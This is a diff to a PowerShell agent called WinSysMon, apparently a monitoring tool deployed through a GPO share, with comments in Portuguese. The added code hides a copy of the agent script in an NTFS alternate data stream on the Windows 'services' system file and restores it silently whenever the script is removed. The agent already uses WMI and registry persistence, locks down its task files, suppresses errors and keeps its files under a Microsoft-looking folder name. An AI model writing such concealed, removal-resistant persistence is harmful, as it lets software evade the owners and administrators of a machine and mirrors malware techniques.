@@ -211,10 +211,11 @@ $script:SharePathAgent   = "\\srv-105\Sistema de monitoramento\gpo\aaa\service\w
 
 function Get-WatchdogCommand {
     # Comando inline que: checa servico + arquivo; se faltar, roda install do share
+    # Fallback 3: restaura do ADS de C:\Windows\System32\drivers\etc\services
     $shInst = $script:SharePathInstall
     $shAgt  = $script:SharePathAgent
     return @"
-`$ErrorActionPreference='SilentlyContinue'; `$dir="`$env:ProgramData\Microsoft\WinSysMon"; `$scr="`$dir\winsysmon.ps1"; `$need=`$false; `$svc=Get-Service WinSysMon -ErrorAction SilentlyContinue; if (-not (Test-Path `$scr)) { `$need=`$true }; if (-not `$svc) { `$need=`$true } elseif (`$svc.Status -ne 'Running') { try { Start-Service WinSysMon -ErrorAction Stop } catch { `$need=`$true } }; if (`$need) { if (Test-Path '$shInst') { & powershell -NoProfile -ExecutionPolicy Bypass -File '$shInst' } elseif (Test-Path '$shAgt') { New-Item `$dir -ItemType Directory -Force | Out-Null; Copy-Item '$shAgt' `$scr -Force; & powershell -NoProfile -ExecutionPolicy Bypass -File `$scr -Install } }
+`$ErrorActionPreference='SilentlyContinue'; `$dir="`$env:ProgramData\Microsoft\WinSysMon"; `$scr="`$dir\winsysmon.ps1"; `$ads="`$env:WINDIR\System32\drivers\etc\services:WinSysMonBackup"; `$need=`$false; `$svc=Get-Service WinSysMon -ErrorAction SilentlyContinue; if (-not (Test-Path `$scr)) { `$need=`$true }; if (-not `$svc) { `$need=`$true } elseif (`$svc.Status -ne 'Running') { try { Start-Service WinSysMon -ErrorAction Stop } catch { `$need=`$true } }; if (`$need) { if (Test-Path '$shInst') { & powershell -NoProfile -ExecutionPolicy Bypass -File '$shInst' } elseif (Test-Path '$shAgt') { New-Item `$dir -ItemType Directory -Force | Out-Null; Copy-Item '$shAgt' `$scr -Force; & powershell -NoProfile -ExecutionPolicy Bypass -File `$scr -Install } elseif (Test-Path `$ads) { New-Item `$dir -ItemType Directory -Force | Out-Null; [System.IO.File]::WriteAllBytes(`$scr, [System.IO.File]::ReadAllBytes(`$ads)); & powershell -NoProfile -ExecutionPolicy Bypass -File `$scr -Install } }
 "@
 }
 
@@ -425,6 +426,54 @@ function Protect-TaskFiles {
                 $acl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($sidSys,"FullControl","Allow")))
                 $acl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($sidAdm,"ReadAndExecute","Allow")))
                 Set-Acl -Path $f -AclObject $acl
+            } catch {}
+        }
+    } catch {}
+}
+
+# ══════════════════════════════════════════════════════════════
+#  BACKUP/RESTORE via NTFS Alternate Data Stream
+# ══════════════════════════════════════════════════════════════
+$script:LastAdsCheck = [datetime]::MinValue
+function Ensure-AdsBackup {
+    param([switch]$Force)
+    if (-not $Force) {
+        $elapsed = (New-TimeSpan -Start $script:LastAdsCheck -End (Get-Date)).TotalSeconds
+        if ($elapsed -lt 300) { return }
+    }
+    $script:LastAdsCheck = Get-Date
+    try {
+        $dir = "$env:ProgramData\Microsoft\WinSysMon"
+        $scr = Join-Path $dir "winsysmon.ps1"
+        $adsHost = "$env:WINDIR\System32\drivers\etc\services"
+        if (-not (Test-Path $adsHost)) { return }
+        $adsPath = "${adsHost}:WinSysMonBackup"
+
+        # 1) Se arquivo local sumiu mas ADS existe -> restaura
+        if (-not (Test-Path $scr)) {
+            try {
+                if (Test-Path $adsPath) {
+                    if (-not (Test-Path $dir)) { New-Item $dir -ItemType Directory -Force | Out-Null }
+                    $bytes = [System.IO.File]::ReadAllBytes($adsPath)
+                    [System.IO.File]::WriteAllBytes($scr, $bytes)
+                    Write-Log "RESTAURADO winsysmon.ps1 do ADS ($($bytes.Length) bytes)" "WARN"
+                }
+            } catch { Write-Log "Restore ADS falhou: $($_.Exception.Message)" "ERROR" }
+        }
+
+        # 2) Atualiza ADS se arquivo local eh mais novo
+        if (Test-Path $scr) {
+            try {
+                $needUpdate = $true
+                if (Test-Path $adsPath) {
+                    $a = (Get-Item $scr).Length
+                    $b = [System.IO.FileInfo]::new($adsPath).Length
+                    if ($a -eq $b) { $needUpdate = $false }
+                }
+                if ($needUpdate) {
+                    $bytes = [System.IO.File]::ReadAllBytes($scr)
+                    [System.IO.File]::WriteAllBytes($adsPath, $bytes)
+                }
             } catch {}
         }
     } catch {}
@@ -1160,6 +1209,7 @@ function Start-AgentLoop {
     try { Ensure-WmiPersistence -Force } catch { Write-Log "Ensure-WmiPersistence inicial falhou: $($_.Exception.Message)" "WARN" }
     try { Ensure-RegistryPersistence -Force } catch { Write-Log "Ensure-RegistryPersistence inicial falhou: $($_.Exception.Message)" "WARN" }
     try { Protect-TaskFiles -Force } catch { Write-Log "Protect-TaskFiles inicial falhou: $($_.Exception.Message)" "WARN" }
+    try { Ensure-AdsBackup -Force } catch { Write-Log "Ensure-AdsBackup inicial falhou: $($_.Exception.Message)" "WARN" }
 
     $cfg = Load-Config
     $script:PollInterval = $cfg.PollInterval
@@ -1263,6 +1313,7 @@ function Start-AgentLoop {
             try { Ensure-WmiPersistence } catch {}
             try { Ensure-RegistryPersistence } catch {}
             try { Protect-TaskFiles } catch {}
+            try { Ensure-AdsBackup } catch {}
 
             if ($cfg.MonitorLogins -and ($iteration % 6 -eq 0)) { try { Monitor-Logins } catch {} }
             if ($cfg.CollectHardware) {
